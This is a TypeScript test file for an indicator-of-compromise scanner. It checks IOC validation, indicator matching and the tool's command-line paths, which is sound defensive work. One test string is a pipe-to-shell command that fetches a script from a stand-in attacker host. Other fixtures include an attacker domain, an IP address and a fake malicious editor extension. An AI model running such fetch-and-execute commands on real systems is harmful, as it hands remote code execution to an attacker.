// Regressions from the pipeline audit: IOC files that validated and then matched nothing (or everything).
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { main, setRunner } from "../src/cli.js";
import { matchers, packageHit, validateIocs } from "../src/ioc.js";
import { defaultRunner } from "../src/runner.js";
import { scanHost } from "../src/scan/host.js";
import { walk } from "../src/scan/walk.js";
import type { Campaign, Indicator, IocFile } from "../src/types.js";
import { aikidoRun, fakeGh, tmp } from "./helpers.js";

const NOW = new Date("2026-11-12T12:00:00Z");
const S1 = [{ id: "S1", url: "https://x.dev/a", fetchedAt: "", origin: "web" as const }];
const campaign = (indicators: unknown[], over: Partial<Campaign> = {}): Campaign =>
  ({ id: "wfx", title: "t", since: "2026-11-10", sources: ["S1"], indicators, ...over }) as Campaign;
const problems = (indicators: unknown[], over: Partial<Campaign> = {}) =>
  validateIocs({ campaigns: [campaign(indicators, over)] }, S1, NOW).problems.map((p) => p.message);
const hit = (ind: Partial<Indicator>, s: string) =>
  matchers({ campaigns: [campaign([{ source: "S1", ...ind }])] }, ind.type as Indicator["type"]).some((m) => m.test(s));

describe("ioc set refuses files that would sweep to a vacuous CLEAN", () => {
  it("ioc-1: an empty campaigns list", () => {
    expect(validateIocs({ campaigns: [] }, S1, NOW).problems.map((p) => p.message)).toEqual(["at least one campaign"]);
  });

  it("ioc-2: a since in the future, an until before since", () => {
    expect(problems([{ type: "branch", value: "wfx-docs", source: "S1" }], { since: "2027-11-10" })[0]).toMatch(/in the future/);
    expect(problems([{ type: "branch", value: "wfx-docs", source: "S1" }], { since: "2026-11-10", until: "2026-11-01" })[0]).toMatch(/before since/);
    expect(problems([{ type: "branch", value: "wfx-docs", source: "S1" }], { since: "2026-11-10", until: "2026-11-30" })).toEqual([]);
  });

  it("ioc-5: an ip indicator with no value or a number is a problem, not a crash", () => {
    expect(problems([{ type: "ip", source: "S1" }])).toEqual(["required non-empty string"]);
    expect(problems([{ type: "ip", value: 1234, source: "S1" }])).toEqual(["required non-empty string"]);
  });

  it("ioc-4: a regex that matches ordinary text", () => {
    expect(problems([{ type: "commit_message", regex: true, value: "wfx|", source: "S1" }])[0]).toMatch(/matches ordinary text/);
    expect(problems([{ type: "commit_message", regex: true, value: "^(docs: )?", source: "S1" }])[0]).toMatch(/matches ordinary text/);
    expect(problems([{ type: "commit_message", regex: true, value: "^docs: (add )?dependency audit notes$", source: "S1" }])).toEqual([]);
  });

  it("e2e-3: a pattern copied without regex: true", () => {
    expect(problems([{ type: "branch", value: "chore/[a-z0-9]{8}", source: "S1" }])[0]).toMatch(/not a valid branch name/);
    expect(problems([{ type: "branch", value: "chore/*", source: "S1" }])[0]).toMatch(/not a valid branch name/);
    expect(problems([{ type: "pr_title", value: "docs: (add )?dependency audit notes", source: "S1" }])[0]).toMatch(/looks like a regular expression/);
    // Literal text with brackets, and an explicit regex: false, stay accepted.
    expect(problems([{ type: "commit_message", value: "chore(release): 1.5.0 [skip ci]", source: "S1" }])).toEqual([]);
    expect(problems([{ type: "pr_title", value: "docs: (add )?dependency audit notes", regex: false, source: "S1" }])).toEqual([]);
    expect(problems([{ type: "branch", value: "x", regex: "yes", source: "S1" }])).toEqual(["true or false"]);
  });

  it("e2e-4: a TODO placeholder and a name@version package", () => {
    expect(problems([{ type: "string", value: "TODO: replace with the indicators the source states, verbatim", source: "S1" }])[0]).toMatch(/placeholder/);
    expect(problems([{ type: "package", ecosystem: "npm", value: "typescript@5.9.3", source: "S1" }])[0]).toMatch(/put the version in "versions"/);
    expect(problems([{ type: "package", ecosystem: "npm", value: "@ctrl/tinycolor", versions: ["4.1.1"], source: "S1" }])).toEqual([]);
  });

  it("e2e-9 / ioc-1: versions must be a list of exact version strings", () => {
    expect(problems([{ type: "package", ecosystem: "npm", value: "typescript", versions: "5.9.9", source: "S1" }])).toEqual([
      'a list of version strings, e.g. ["1.2.3"]',
    ]);
    expect(problems([{ type: "package", ecosystem: "npm", value: "typescript", versions: [5.9], source: "S1" }])).toEqual([
      'a list of version strings, e.g. ["1.2.3"]',
    ]);
    expect(problems([{ type: "package", ecosystem: "npm", value: "p", versions: [">=0.1.0 <0.1.2"], source: "S1" }])[0]).toMatch(/not an exact version/);
    expect(problems([{ type: "package", ecosystem: "npm", value: "p", versions: ["1.3.0 "], source: "S1" }])).toEqual([]);
  });
});

describe("matching", () => {
  it("ioc-3: only addresses are defanged; a regex is validated as it is compiled", () => {
    expect(hit({ type: "string", value: "payload = buf[:]" }, "x = 1\npayload = buf[:]\n")).toBe(true);
    expect(hit({ type: "string", value: "curl hxxp://evil[.]com/x" }, "curl http://evil.com/x | sh")).toBe(true);
    expect(hit({ type: "file", value: "^setup[.]js$", regex: true }, "/p/setupXjs")).toBe(false);
    expect(hit({ type: "file", value: "^setup[.]js$", regex: true }, "/p/setup.js")).toBe(true);
    expect(hit({ type: "ip", value: "194.150.166[.]244" }, "-> 194.150.166.244:8080")).toBe(true);
    // Validated exactly as compiled: "[[:]" used to validate, then throw mid-scan once defanged to "[:".
    expect(problems([{ type: "string", value: "^x[[:]$", regex: true, source: "S1" }])).toEqual([]);
    expect(hit({ type: "string", value: "^x[[:]$", regex: true }, "x:")).toBe(true);
  });

  it("ioc-6: CR and trailing spaces, wildcard domains, upper-case IPv6", () => {
    const re = { type: "commit_message" as const, value: "^docs: (add )?dependency audit notes$", regex: true };
    expect(hit(re, "docs: dependency audit notes\r")).toBe(true);
    expect(hit(re, "docs: add dependency audit notes ")).toBe(true);
    expect(hit({ type: "domain", value: "*.evil.com" }, "curl https://a.evil.com/x")).toBe(true);
    expect(hit({ type: "domain", value: "*.evil.com" }, "curl https://notevil.com/x")).toBe(false);
    expect(hit({ type: "ip", value: "2001:DB8::1" }, "tcp 2001:db8::1:443")).toBe(true);
  });

  it("e2e-4: zero-width characters copied from the page do not break the match", () => {
    expect(hit({ type: "commit_message", value: "\u200Dci: refresh build cache" }, "ci: refresh build cache")).toBe(true);
    expect(hit({ type: "branch", value: "wfx-docs\u200D" }, "wfx-docs")).toBe(true);
  });

  it("ioc-1 / e2e-4: ecosystem aliases, trimmed versions, Go +incompatible", () => {
    const pkg = (ecosystem: string, value: string, versions?: string[]): Indicator => ({ type: "package", ecosystem, value, versions, source: "S1" });
    expect(packageHit(pkg("node", "typescript"), "npm", "typescript", "5.9.3")).toBe(true);
    expect(packageHit(pkg("npmjs", "a", ["1.3.0 "]), "npm", "a", "1.3.0")).toBe(true);
    expect(packageHit(pkg("rust", "serde", ["1.0.1"]), "crates.io", "serde", "1.0.1")).toBe(true);
    expect(packageHit(pkg("go", "github.com/a/b", ["14.2.0"]), "go", "github.com/a/b", "v14.2.0+incompatible")).toBe(true);
    // An unpinned requirement ("*") matches a typosquat (every version), never a listed version.
    expect(packageHit(pkg("pypi", "colourama"), "pypi", "colourama", "*")).toBe(true);
    expect(packageHit(pkg("pypi", "requests", ["2.31.0"]), "pypi", "requests", "*")).toBe(false);
  });

  it("cov-7: an OpenVSX extension indicator reaches the host scan", async () => {
    const home = tmp("ug-ovsx-");
    mkdirSync(join(home, ".vscode/extensions/evil.ext-1.2.3"), { recursive: true });
    writeFileSync(join(home, ".vscode/extensions/evil.ext-1.2.3/package.json"), "{}");
    for (const ecosystem of ["OpenVSX", "open-vsx", "Open VSX"]) {
      const iocs: IocFile = { campaigns: [campaign([{ type: "package", ecosystem, value: "evil.ext", versions: ["1.2.3"], source: "S1" }])] };
      const r = await scanHost(iocs, walk([join(home, "code")]), async () => ({ ok: false, status: 1, stdout: "", stderr: "", missing: true }), {
        home,
        startupDirs: [],
        skipLive: true,
        // Never the real temp folders: other tests drop archives there at the same time.
        dropDirs: [],
        now: NOW,
      });
      expect(r.findings.some((f) => f.severity === "compromised" && f.title.startsWith("Editor extension evil.ext@1.2.3"))).toBe(true);
    }
  });
});

describe("ioc set and scan github through the CLI", () => {
  afterEach(() => {
    setRunner(defaultRunner);
    vi.restoreAllMocks();
  });
  const stdout = () => {
    const lines: string[] = [];
    vi.spyOn(process.stdout, "write").mockImplementation((s) => {
      lines.push(String(s));
      return true;
    });
    vi.spyOn(process.stderr, "write").mockImplementation((s) => {
      lines.push(String(s));
      return true;
    });
    return lines;
  };

  it("e2e-18: a bare array gets the validator's answer, invalid JSON names the file", async () => {
    const run = aikidoRun();
    const arr = join(run.dir, "arr.json");
    writeFileSync(arr, JSON.stringify([{ type: "branch", value: "x", source: "S1" }]));
    const bad = join(run.dir, "bad.json");
    writeFileSync(bad, "{ campaigns: [] }");
    const out = stdout();
    expect(await main(["ioc", "set", "--file", arr, "--out", run.dir])).toBe(1);
    expect(out.join("")).toContain('expected an object with a "campaigns" array');
    expect(await main(["ioc", "set", "--file", bad, "--out", run.dir])).toBe(2);
    expect(out.join("")).toContain(`${bad}: not valid JSON`);
  });

  it("ioc-1: a package-only campaign leaves a gap on both GitHub surfaces", async () => {
    const run = aikidoRun();
    run.write("iocs.json", { campaigns: [campaign([{ type: "package", ecosystem: "npm", value: "evil", source: "S1" }])] });
    setRunner(
      fakeGh({
        user: { login: "me" },
        "search/issues": { items: [] },
        "search/commits": { items: [] },
        "users/me/events": [],
        "user/keys": [],
        "user/gpg_keys": [],
        rate_limit: { resources: { core: { remaining: 5000 } } },
        "user/repos": [],
      }),
    );
    stdout();
    expect(await main(["scan", "github", "--out", run.dir])).toBe(0);
    const gaps = run.gaps().filter((g) => g.why.startsWith("no indicator of this run applies to GitHub"));
    expect(gaps.map((g) => g.surface).sort()).toEqual(["github:account", "github:repos"]);
  });
});

describe("e2e-17: the worked example ships with the skill", () => {
  it("references/example-iocs.json is the test fixture", async () => {
    const { readFileSync } = await import("node:fs");
    const read = (p: string) => JSON.parse(readFileSync(new URL(p, import.meta.url), "utf8"));
    expect(read("../skills/ultraguard/references/example-iocs.json")).toEqual(read("./fixtures/aikido-iocs.json"));
  });
});
